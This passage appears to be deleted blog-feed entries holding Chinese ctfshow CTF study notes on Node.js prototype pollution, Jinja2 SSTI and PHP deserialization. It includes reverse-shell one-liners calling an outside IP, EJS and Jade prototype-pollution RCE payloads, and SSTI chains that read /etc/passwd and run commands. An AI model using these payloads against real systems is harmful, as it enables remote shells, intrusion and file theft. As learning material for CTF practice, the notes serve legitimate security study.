-</thead>
-<tbody><tr>
-<td>input</td>
-<td>要转换的数据（字符串或数组）</td>
-</tr>
-<tr>
-<td>encoding</td>
-<td>编码方式（常用有：<code>utf8</code>, <code>base64</code>, <code>hex</code>, <code>binary</code>）</td>
-</tr>
-</tbody></table>
-<h2 id="2-res-render-函数"><a href="#2-res-render-函数" class="headerlink" title="2.res.render()函数:"></a>2.res.render()函数:</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.<span class="title function_">render</span>(view, locals, callback)</span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>view</code></td>
-<td>模板名称（不带扩展名），如 <code>index</code></td>
-</tr>
-<tr>
-<td><code>locals</code></td>
-<td>传入模板的数据对象，如 <code>&#123;username: &#39;admin&#39;&#125;</code></td>
-</tr>
-<tr>
-<td><code>callback</code>（可选）</td>
-<td>如果提供，则不会自动发送响应，而是返回 HTML 字符串</td>
-</tr>
-</tbody></table>
-<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染:"></a>原型链污染:</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">能修改 <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>，就能影响所有对象</span><br></pre></td></tr></table></figure>
-
-<h2 id="1-Functon"><a href="#1-Functon" class="headerlink" title="1.Functon()():"></a>1.Functon()():</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">传入bash去运行   bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp/<span class="number">139.224</span><span class="number">.54</span><span class="number">.229</span>/<span class="number">9090</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">有可能需要两次bash： bash -c \<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1\&quot;</span></span><br><span class="line"><span class="string">global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1&#x27;)</span></span><br><span class="line"><span class="string">global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1\&quot;&#x27;)</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="2-ejs的-rce"><a href="#2-ejs的-rce" class="headerlink" title="2.ejs的 rce:"></a>2.ejs的 rce:</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="attr">payload</span>:</span><br><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="3-jade的rce"><a href="#3-jade的rce" class="headerlink" title="3.jade的rce:"></a>3.jade的rce:</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Block&quot;</span>,<span class="string">&quot;nodes&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;compileDebug&quot;</span>:<span class="number">1</span>,<span class="string">&quot;self&quot;</span>:<span class="number">1</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/139.224.54.229/9090 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">注意:   <span class="title class_">Content</span>-<span class="title class_">Type</span>:application/json</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-]]></content>
-      <categories>
-        <category>web学习</category>
-      </categories>
-      <tags>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ssti</title>
-    <url>/2025/06/02/ctfshow/ssti/</url>
-    <content><![CDATA[<h1 id="常见检测"><a href="#常见检测" class="headerlink" title="常见检测:"></a>常见检测:</h1><table>
-<thead>
-<tr>
-<th>语言</th>
-<th>模板引擎</th>
-<th>示例 Payload</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Python</td>
-<td>Jinja2</td>
-<td><code>&#123;&#123;7*7&#125;&#125;</code> → 49</td>
-</tr>
-<tr>
-<td>Python</td>
-<td>Mako</td>
-<td><code>$&#123;7*7&#125;</code> → 49</td>
-</tr>
-<tr>
-<td>PHP</td>
-<td>Smarty</td>
-<td><code>&#123;$smarty.version&#125;</code></td>
-</tr>
-<tr>
-<td>Java</td>
-<td>FreeMarker</td>
-<td><code>$&#123;7*7&#125;</code> → 49</td>
-</tr>
-<tr>
-<td>Java</td>
-<td>Velocity</td>
-<td><code>#set($x=7*7) $x</code></td>
-</tr>
-<tr>
-<td>Node.js</td>
-<td>EJS</td>
-<td><code>&lt;%= 7*7 %&gt;</code></td>
-</tr>
-</tbody></table>
-<p><img src="C:\Users\wanyan\AppData\Roaming\Typora\typora-user-images\image-20250527155737650.png" alt="image-20250527155737650"></p>
-<h1 id="各个模块"><a href="#各个模块" class="headerlink" title="各个模块:"></a>各个模块:</h1><h2 id="1-jinja2"><a href="#1-jinja2" class="headerlink" title="1.jinja2:"></a>1.jinja2:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">控制结构 &#123;% %&#125;</span><br><span class="line">变量取值 &#123;&#123; &#125;&#125;</span><br><span class="line">注释 &#123;# #&#125;</span><br><span class="line">查看所有模块:</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="1-Python-2-7"><a href="#1-Python-2-7" class="headerlink" title="1. Python 2.7"></a>1. Python 2.7</h3><h4 id="1-获取基类"><a href="#1-获取基类" class="headerlink" title="1. 获取基类:"></a>1. 获取基类:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[1]</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="2-文件操作"><a href="#2-文件操作" class="headerlink" title="2. 文件操作:"></a>2. 文件操作:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 找到 file 类</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40]</span><br><span class="line"></span><br><span class="line"># 读文件</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()</span><br><span class="line"></span><br><span class="line"># 写文件</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40](&#x27;/tmp/test&#x27;,&#x27;w&#x27;).write(&#x27;test&#x27;)</span><br></pre></td></tr></table></figure>
-
-
-<h4 id="3-命令执行"><a href="#3-命令执行" class="headerlink" title="3. 命令执行:"></a>3. 命令执行:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 方法1：通过 func_globals.linecache.os 执行系统命令</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;id&#x27;).read()</span><br><span class="line"></span><br><span class="line"># 方法2：通过 __builtins__ 中的 eval 执行命令</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class="line"></span><br><span class="line"># 方法3：属性式调用 eval</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class="line"></span><br><span class="line"># 方法4：调用 __import__ 执行命令</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br><span class="line"></span><br><span class="line"># 方法5：索引方式调用 __import__</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="2-Python-3-7"><a href="#2-Python-3-7" class="headerlink" title="2. Python 3.7"></a>2. Python 3.7</h3><h4 id="1-获取基类-1"><a href="#1-获取基类-1" class="headerlink" title="1. 获取基类:"></a>1. 获取基类:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[1]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[1]</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h4 id="2-文件操作-1"><a href="#2-文件操作-1" class="headerlink" title="2. 文件操作:"></a>2. 文件操作:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 遍历找到 catch_warnings 类，再调用 open 读文件</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">  &#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">    &#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;,&#x27;r&#x27;).read() &#125;&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h4 id="3-命令执行-1"><a href="#3-命令执行-1" class="headerlink" title="3. 命令执行:"></a>3. 命令执行:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 遍历找到 catch_warnings 类，再用 eval 调用 os.popen 执行命令</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">  &#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">    &#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"># 也可尝试 popen 直接调用（仅当 popen 未被删减）</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&quot;cat /flag&quot;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">#无下划线版</span><br><span class="line">&#123;&#123;(lipsum | attr(request.values.b)).os.popen(request.values.a).read()&#125;&#125;&amp;a=cat /flag&amp;b=__globals__</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h3 id="3-各种过滤"><a href="#3-各种过滤" class="headerlink" title="3.各种过滤:"></a>3.各种过滤:</h3><h4 id="1-绕过过滤"><a href="#1-绕过过滤" class="headerlink" title="1.绕过过滤:"></a>1.<code>&#123;%%&#125;</code>绕过过滤<code>&#123;&#123;&#125;&#125;</code>:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">尝试&#123;%%&#125;，想回显内容在外面加个print就行</span><br><span class="line">&#123;%print(&quot;&quot;.__class__)%&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-getitem-绕过-过滤："><a href="#2-getitem-绕过-过滤：" class="headerlink" title="2.getitem()绕过[]过滤："></a>2.getitem()绕过[]过滤：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getitem() 是python的一个魔术方法,对字典使用时,传入字符串,返回字典相应键所对应的值:当对列表使用时,传入整数返回列表对应索引的值。</span><br><span class="line">原本是[117]，中括号被ban就用</span><br><span class="line">__getitem__(117)代替[117]</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-request方法绕过引号："><a href="#3-request方法绕过引号：" class="headerlink" title="3.request方法绕过引号："></a>3.request方法绕过引号：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">request在flask中可以访问基于 HTTP 请求传递的所有信息，这里的request并非python的函数，而是在flask内部的函数。</span><br><span class="line">request.args.key  #获取get传入的key的值</span><br><span class="line">request.form.key  #获取post传入参数(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">reguest.values.key  #获取所有参数，如果get和post有同一个参数，post的参数会覆盖get</span><br><span class="line">request.cookies.key  #获取cookies传入参数</span><br><span class="line">request.headers.key  #获取请求头请求参数</span><br><span class="line">request.data  #获取post传入参数(Content-Type:a/b)</span><br><span class="line">request.json  #获取post传入json参数 (Content-Type: application/json)</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
-]]></content>
-      <categories>
-        <category>web学习</category>
-      </categories>
-      <tags>
-        <tag>ctfshow</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>反序列化</title>
-    <url>/2025/06/02/ctfshow/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
-    <content><![CDATA[<h1 id="常识"><a href="#常识" class="headerlink" title="常识:"></a>常识:</h1><h2 id="1-各类魔术方法"><a href="#1-各类魔术方法" class="headerlink" title="1.各类魔术方法:"></a>1.各类魔术方法:</h2><table>
-<thead>
-<tr>
-<th>魔术方法</th>
-<th>触发时机</th>
-<th>典型用途</th>
-<th>攻击&#x2F;利用常见点</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>__construct()</code></td>
-<td>实例化对象时</td>
-<td>初始化对象属性</td>
-<td>一般不用于攻击，但可配合伪类实现替代类注入</td>
-</tr>
-<tr>
-<td><code>__destruct()</code></td>
-<td>对象销毁时（GC &#x2F; 程序结束）</td>
-<td>资源释放、日志等</td>
-<td>✅常见反序列化POP链触发点，可执行恶意逻辑（如 system）</td>
-</tr>
-<tr>
-<td><code>__call($method, $args)</code></td>
-<td>调用不存在的对象方法</td>
-<td>动态路由、代理调用</td>
-<td>✅ 可结合参数污染触发函数劫持</td>
-</tr>
-<tr>
-<td><code>__callStatic($method, $args)</code></td>
-<td>调用不存在的静态方法</td>
-<td>同上，静态版</td>
-<td>✅ 框架中常被用作绕过点</td>
-</tr>
-<tr>
-<td><code>__get($name)</code></td>
-<td>读取不存在&#x2F;不可见属性</td>
-<td>延迟加载、动态代理</td>
-<td>✅ 常配合属性污染用于变量值劫持</td>
-</tr>
-<tr>
-<td><code>__set($name, $value)</code></td>
-<td>写入不存在&#x2F;不可见属性</td>
-<td>数据保护、日志等</td>
-<td>⚠️ 可用于伪造属性影响程序流</td>
-</tr>
-<tr>
-<td><code>__isset($name)</code></td>
-<td>使用 isset() 检测不存在属性时</td>
-<td>判断状态</td>
-<td>⚠️ 可辅助触发条件</td>
-</tr>
-<tr>
-<td><code>__unset($name)</code></td>
-<td>使用 unset() 删除不存在属性时</td>
-<td>自定义清理</td>
-<td>⚠️ 辅助</td>
-</tr>
-<tr>
-<td><code>__sleep()</code></td>
-<td><code>serialize()</code> 时触发</td>
-<td>控制哪些属性被序列化</td>
-<td>✅ 可精简 payload，绕过属性检测</td>
-</tr>
-<tr>
-<td><code>__wakeup()</code></td>
-<td><code>unserialize()</code> 时触发</td>
-<td>恢复连接、状态</td>
-<td>✅ 反序列化利用链典型入口点</td>
-</tr>
-<tr>
-<td><code>__unserialize($data)</code></td>
-<td>PHP 7.4+ <code>unserialize()</code> 时触发</td>
-<td>替代 <code>__wakeup</code></td>
-<td>✅ 新POP链构造点，精准控制反序列化行为</td>
-</tr>
-<tr>
-<td><code>__toString()</code></td>
-<td>对象被当作字符串用时</td>
-<td>模拟字符串对象</td>
-<td>✅ CTF绕过，如 <code>echo $obj</code> → 触发命令执行</td>
-</tr>
-<tr>
-<td><code>__invoke()</code></td>
-<td>对象被当作函数调用时</td>
-<td>匿名函数、执行器</td>
-<td>✅ 动态代码执行链中使用</td>
-</tr>
-<tr>
-<td><code>__set_state($array)</code></td>
-<td><code>var_export()</code> 导出再 <code>eval()</code> 恢复时触发</td>
-<td>配置类导出导入</td>
-<td>⚠️ 低频使用，静态类构建</td>
-</tr>
-<tr>
-<td><code>__debugInfo()</code></td>
-<td><code>var_dump()</code> 时触发</td>
-<td>自定义调试输出</td>
-<td>⚠️ 安全性低，但可用于信息泄露场景</td>
-</tr>
-<tr>
-<td><code>__clone()</code></td>
-<td>使用 <code>clone</code> 关键字时触发</td>
-<td>深复制定制化</td>
-<td>⚠️ 辅助构造链，不是主攻点</td>
-</tr>
-</tbody></table>
-<h3 id="利用优先级"><a href="#利用优先级" class="headerlink" title="利用优先级:"></a>利用优先级:</h3><table>
-<thead>
-<tr>
-<th>优先级</th>
-<th>魔术方法</th>
-<th>利用说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>🥇 必备</td>
-<td><code>__destruct</code>, <code>__wakeup</code>, <code>__unserialize</code>, <code>__toString</code></td>
-<td>关键触发点，常用于反序列化+代码执行</td>
-</tr>
-<tr>
-<td>🥈 常用</td>
-<td><code>__call</code>, <code>__get</code>, <code>__set</code>, <code>__invoke</code></td>
-<td>控制流中用于中转跳板，劫持参数、动态执行</td>
-</tr>
-<tr>
-<td>🥉 次要</td>
-<td><code>__sleep</code>, <code>__callStatic</code>, <code>__set_state</code>, <code>__clone</code></td>
-<td>配合使用，精细控制链构造、执行流程</td>
-</tr>
-<tr>
-<td>⚠️ 罕见</td>
-<td><code>__isset</code>, <code>__unset</code>, <code>__debugInfo</code></td>
-<td>辅助性质，信息泄露或条件判断中用到</td>
-</tr>
-</tbody></table>
-<h1 id="基础用法"><a href="#基础用法" class="headerlink" title="基础用法:"></a>基础用法:</h1><h2 id="1-哪些是可以被反序列化出来的值"><a href="#1-哪些是可以被反序列化出来的值" class="headerlink" title="1.哪些是可以被反序列化出来的值:"></a>1.哪些是可以被反序列化出来的值:</h2><table>
-<thead>
-<tr>
-<th>数据类型</th>
-<th>可否反序列化</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>O:</code> 对象</td>
-<td>✅ 是</td>
-<td>能反序列化为类对象，前提是类存在或实现了 <code>__autoload()</code> &#x2F; <code>spl_autoload_register()</code></td>
-</tr>
-<tr>
-<td><code>a:</code> 数组</td>
-<td>✅ 是</td>
-<td>支持关联数组、索引数组</td>
-</tr>
-<tr>
-<td><code>s:</code> 字符串</td>
-<td>✅ 是</td>
-<td>普通字符串可直接还原</td>
-</tr>
-<tr>
-<td><code>i:</code> 整数</td>
-<td>✅ 是</td>
-<td>会转回 PHP 中的整数类型</td>
-</tr>
-<tr>
-<td><code>d:</code> 浮点数</td>
-<td>✅ 是</td>
-<td>会被还原为 float 类型</td>
-</tr>
-<tr>
-<td><code>b:</code> 布尔值</td>
-<td>✅ 是</td>
-<td><code>b:0;</code> 为 false，<code>b:1;</code> 为 true</td>
-</tr>
-<tr>
-<td><code>N;</code> null</td>
-<td>✅ 是</td>
-<td>被还原为 <code>NULL</code></td>
-</tr>
-<tr>
-<td><code>r:</code> &amp; <code>R:</code> 引用</td>
-<td>✅ 是</td>
-<td>用于同一变量多次引用，特殊情况使用，较少见</td>
-</tr>
-<tr>
-<td><code>C:</code> 自定义序列化对象</td>
-<td>✅ 是</td>
-<td>需要类实现了 <code>Serializable</code> 接口</td>
-</tr>
-<tr>
-<td><code>E:</code> 异常对象</td>
-<td>⛔ 否</td>
-<td><code>Exception</code> 等无法序列化传递再恢复成可用异常对象</td>
-</tr>
-<tr>
-<td>资源类型</td>
-<td>⛔ 否</td>
-<td>如文件句柄等，<code>fopen()</code> 的结果不可序列化</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>漏洞点</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>类存在但未正确限制 <code>__wakeup()</code>、<code>__destruct()</code>、<code>__toString()</code>、<code>__call()</code> 等魔术方法</td>
-<td>可能造成<strong>命令执行、文件操作、SQL注入等利用</strong></td>
-</tr>
-<tr>
-<td>存在 <code>Serializable</code> 接口但处理不严谨</td>
-<td>可控制反序列化过程中的内容，伪造内部逻辑</td>
-</tr>
-<tr>
-<td>存在 <code>__autoload</code> 或自动加载机制</td>
-<td>可通过构造类名配合 phar 包等技巧，实现远程加载</td>
-</tr>
-<tr>
-<td>反序列化过程中触发数据库、文件、系统函数</td>
-<td>可造成 <strong>POP链</strong>（Property-Oriented Programming）攻击</td>
-</tr>
-</tbody></table>
-<h2 id="2-X-Forwarded-For请求头："><a href="#2-X-Forwarded-For请求头：" class="headerlink" title="2.X-Forwarded-For请求头："></a>2.X-Forwarded-For请求头：</h2><p><strong>不属于某个编程语言特有的头部</strong>，它是一个 <strong>HTTP协议层的请求头（Header）</strong>，<strong>与语言无关</strong></p>
-<table>
-<thead>
-<tr>
-<th>语言&#x2F;框架</th>
-<th>使用方式</th>
-<th>获取真实 IP 的方法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>PHP</strong></td>
-<td><code>$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]</code></td>
-<td>或搭配 <code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code> 使用</td>
-</tr>
-<tr>
-<td><strong>Python（Flask&#x2F;Django）</strong></td>
-<td><code>request.headers.get(&#39;X-Forwarded-For&#39;)</code></td>
-<td>默认 <code>request.remote_addr</code> 是代理地址</td>
-</tr>
-<tr>
-<td><strong>Node.js (Express)</strong></td>
-<td><code>req.headers[&#39;x-forwarded-for&#39;]</code></td>
-<td>或 <code>req.ip</code>（需设置 <code>trust proxy</code>）</td>
-</tr>
-<tr>
-<td><strong>Java (Spring Boot)</strong></td>
-<td><code>request.getHeader(&quot;X-Forwarded-For&quot;)</code></td>
-<td>配合 <code>RemoteAddrFilter</code> 使用</td>
-</tr>
-<tr>
-<td><strong>Go (Gin&#x2F;Echo)</strong></td>
-<td><code>c.Request.Header.Get(&quot;X-Forwarded-For&quot;)</code></td>
-<td>原始IP识别</td>
-</tr>
-<tr>
-<td><strong>Nginx &#x2F; Apache（Web服务器）</strong></td>
-<td><code>real_ip_header X-Forwarded-For;</code></td>
-<td>可用于替换 <code>REMOTE_ADDR</code></td>
-</tr>
-<tr>
-<td><strong>Ruby on Rails</strong></td>
-<td><code>request.headers[&quot;X-Forwarded-For&quot;]</code></td>
-<td>也可用 <code>request.remote_ip</code></td>
-</tr>
-<tr>
-<td><strong>ASP.NET</strong></td>
-<td><code>Request.Headers[&quot;X-Forwarded-For&quot;]</code></td>
-<td>常用于云服务中恢复用户IP</td>
-</tr>
-</tbody></table>
-<h2 id="3-php原生类"><a href="#3-php原生类" class="headerlink" title="3.php原生类:"></a>3.php原生类:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">当调用一个不存在的方法会触发__call魔术方法，可以通过想哪一些原生类中存在__call魔术方法，再重写魔术方法就行了</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-常见含-call魔术方法的原生类"><a href="#1-常见含-call魔术方法的原生类" class="headerlink" title="1.常见含__call魔术方法的原生类:"></a>1.常见含__call魔术方法的原生类:</h3><table>
-<thead>
-<tr>
-<th>类名</th>
-<th>来源</th>
-<th>是否原生</th>
-<th>利用意义</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><code>SoapClient</code></td>
-<td>PHP 扩展 <code>soap</code></td>
-<td>✅ 是</td>
-<td>任意方法调用时触发 __call，可造成代码逻辑分流</td>
-</tr>
-<tr>
-<td><code>Phar</code></td>
-<td>PHP 扩展 <code>phar</code></td>
-<td>✅ 是</td>
-<td>存在 <code>__call</code>，配合文件操作可能形成 phar POP 链</td>
-</tr>
-<tr>
-<td><code>SQLite3</code></td>
-<td>扩展 <code>sqlite3</code></td>
-<td>✅ 是</td>
-<td>当调用不存在函数（函数未定义）时触发 __call</td>
-</tr>
-<tr>
-<td><code>GMP</code></td>
-<td>PHP 扩展 <code>gmp</code></td>
-<td>✅ 是</td>
-<td>虽有实现但较难用于利用</td>
-</tr>
-<tr>
-<td><code>DateTimeImmutable</code></td>
-<td>PHP 核心</td>
-<td>✅ 是</td>
-<td>存在魔术方法组合，但利用性较低</td>
-</tr>
-<tr>
-<td><code>ReflectionFunctionAbstract</code></td>
-<td>PHP 核心</td>
-<td>✅ 是</td>
-<td>某些版本中有魔术方法，但易失效</td>
-</tr>
-<tr>
-<td><code>PDO</code></td>
-<td>PHP 核心</td>
-<td>✅ 是</td>
-<td>某些子类有 <code>__call</code>（如通过驱动动态方法绑定）</td>
-</tr>
-<tr>
-<td><code>DirectoryIterator</code></td>
-<td>SPL</td>
-<td>✅ 是</td>
-<td>间接触发可能存在于迭代器组合中</td>
-</tr>
-<tr>
-<td><code>MongoDB\Driver\Manager</code></td>
-<td>MongoDB 扩展</td>
-<td>✅ 是</td>
-<td>某些调用未定义方法可触发 __call</td>
-</tr>
-</tbody></table>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">查询原生类的方法;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="variable">$magicMethods</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="comment">// &#x27;__destruct&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__toString&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__wakeup&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">    <span class="comment">// &#x27;__callStatic&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__get&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__set&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__isset&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__unset&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__invoke&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__set_state&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$magicMethods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$class</span>, <span class="variable">$method</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="4-字符串溢出"><a href="#4-字符串溢出" class="headerlink" title="4.字符串溢出:"></a>4.字符串溢出:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在反序列化之后&#125;<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;，如果能做到这样，那么在第一个&#125;之后的数据会忽视</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="5-session反序列化漏洞："><a href="#5-session反序列化漏洞：" class="headerlink" title="5.session反序列化漏洞："></a>5.session反序列化漏洞：</h2><h3 id="1-php处理器"><a href="#1-php处理器" class="headerlink" title="1.php处理器:"></a>1.php处理器:</h3><p>session.serialize_handler的引擎有看下面。<br>注：php_serialize是从5.5.4开始使用的。</p>
-<table>
-<thead>
-<tr>
-<th align="left"><strong>处理器名称</strong></th>
-<th align="left"><strong>存储格式</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left"><strong>php</strong></td>
-<td align="left"><strong>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</strong></td>
-</tr>
-<tr>
-<td align="left"><strong>php_binary</strong></td>
-<td align="left"><strong>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</strong></td>
-</tr>
-<tr>
-<td align="left"><strong>php_serialize</strong></td>
-<td align="left"><strong>经过serialize()函数序列化处理的数组</strong>  php_serialize在内部简单地直接使用 serialize&#x2F;unserialize函数</td>
-</tr>
-</tbody></table>
-<p>php_serialize处理器是进行了一次php序列化，但是我们传入了一个|，在php处理器的理解是</p>
-<blockquote>
-<p>这三部分</p>
-<p>a:1:{s:7:”session”;s:37:” &#x2F;&#x2F;键名，这个是不解析的</p>
-<p>| &#x2F;&#x2F;分隔符</p>
-<p>O:1:”A”:1:{s:1:”a”;s:9:”phpinfo()”;} &#x2F;&#x2F;键值</p>
-</blockquote>
-<h3 id="2-session-start默认开启"><a href="#2-session-start默认开启" class="headerlink" title="2.session_start默认开启:"></a>2.session_start默认开启:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>()，这里php的版本是<span class="number">7.3</span>.<span class="number">11</span>，所以就是默认就是<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
